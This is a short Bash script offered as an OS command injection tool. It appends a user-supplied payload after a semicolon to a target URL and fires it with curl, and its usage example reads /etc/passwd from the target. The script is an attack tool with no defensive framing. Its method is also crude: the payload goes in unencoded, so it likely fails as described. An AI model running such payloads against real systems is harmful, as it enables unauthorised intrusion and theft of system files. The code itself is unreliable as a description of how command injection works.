#!/bin/bash
# OS Command Injection - Injecting OS commands into a vulnerable parameter
# Options:
# <target_url> : URL with vulnerable parameter
# <payload> : OS command injection payload

# Usage: os_command_injection.sh <target_url> <payload>
# Example script
# os_command_injection.sh "http://example.com/vuln.php?param=1" "cat /etc/passwd"

# Ensure parameters are provided
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <target_url> <payload>"
    exit 1
fi

TARGET_URL=$1
PAYLOAD=$2

echo "Starting OS command injection on $TARGET_URL with payload $PAYLOAD"

# Perform OS command injection
curl "$TARGET_URL;$PAYLOAD"

echo "OS command injection completed."
